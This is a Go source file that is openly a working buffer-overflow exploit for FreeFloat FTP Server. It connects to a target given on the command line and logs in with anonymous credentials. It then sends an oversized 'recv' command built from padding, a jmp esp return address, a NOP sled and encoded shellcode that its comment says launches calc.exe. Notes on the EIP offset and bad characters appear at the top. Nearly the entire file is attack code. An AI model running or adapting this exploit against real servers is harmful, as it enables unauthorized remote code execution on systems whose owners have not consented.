// Buffer overflow exploit for FreeFloatFTP Server
// By disastrpc @ github.com/disastrpc
// FreeFloatFTP server suffers from a buffer overflow vulnerability that allows arbitrary code to be executed by sending a sufficiently large RECV offset. This allows for arbitrary code execution to be performed on remote machines. Credentials are needed if anonymous access is not allowed.

package main

//notes
//EIP at offset 246
//49326941
//badchars \x00(nullbyte) \x0A (LF) \x0D

//6d6f6320
import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"time"
)

const username string = "anonymous"
const password string = "anonymous"

func main() {

	target := os.Args[1]
	conn, err := net.DialTimeout("tcp", target, 5*time.Second)
	if err != nil {
		fmt.Println("Error dialing TCP address")
		os.Exit(1)
	}

	buf := strings.Repeat("A", 246)
	// jmp esp address in USER32.DLL
	buf += "\x2b\x40\xa8\x76"
	buf += strings.Repeat("\x90", 30)
	// pops calc.exe on target
	buf += "\xdb\xd8\xd9\x74\x24\xf4\x5a\xbe\x88\xfc\x15\x37\x31"
	buf += "\xc9\xb1\x31\x83\xea\xfc\x31\x72\x14\x03\x72\x9c\x1e"
	buf += "\xe0\xcb\x74\x5c\x0b\x34\x84\x01\x85\xd1\xb5\x01\xf1"
	buf += "\x92\xe5\xb1\x71\xf6\x09\x39\xd7\xe3\x9a\x4f\xf0\x04"
	buf += "\x2b\xe5\x26\x2a\xac\x56\x1a\x2d\x2e\xa5\x4f\x8d\x0f"
	buf += "\x66\x82\xcc\x48\x9b\x6f\x9c\x01\xd7\xc2\x31\x26\xad"
	buf += "\xde\xba\x74\x23\x67\x5e\xcc\x42\x46\xf1\x47\x1d\x48"
	buf += "\xf3\x84\x15\xc1\xeb\xc9\x10\x9b\x80\x39\xee\x1a\x41"
	buf += "\x70\x0f\xb0\xac\xbd\xe2\xc8\xe9\x79\x1d\xbf\x03\x7a"
	buf += "\xa0\xb8\xd7\x01\x7e\x4c\xcc\xa1\xf5\xf6\x28\x50\xd9"
	buf += "\x61\xba\x5e\x96\xe6\xe4\x42\x29\x2a\x9f\x7e\xa2\xcd"
	buf += "\x70\xf7\xf0\xe9\x54\x5c\xa2\x90\xcd\x38\x05\xac\x0e"
	buf += "\xe3\xfa\x08\x44\x09\xee\x20\x07\x47\xf1\xb7\x3d\x25"
	buf += "\xf1\xc7\x3d\x19\x9a\xf6\xb6\xf6\xdd\x06\x1d\xb3\x12"
	buf += "\x4d\x3c\x95\xba\x08\xd4\xa4\xa6\xaa\x02\xea\xde\x28"
	buf += "\xa7\x92\x24\x30\xc2\x97\x61\xf6\x3e\xe5\xfa\x93\x40"
	buf += "\x5a\xfa\xb1\x22\x3d\x68\x59\x8b\xd8\x08\xf8\xd3"

	buf += strings.Repeat("C", 250)

	reader := bufio.NewReader(conn)
	fmt.Printf("[*] Connecting to %v\n", target)
	reader.ReadString('\n')
	fmt.Fprintf(conn, "USER %v\r", username)
	reader.ReadString('\n')
	fmt.Fprintf(conn, "PASS %v\r", password)
	fmt.Fprintf(conn, "recv %v\r", buf)
	reader.ReadString('\n')
	fmt.Printf("Sending bytes\n")
	time.Sleep(1 * time.Second)
	conn.Close()
}
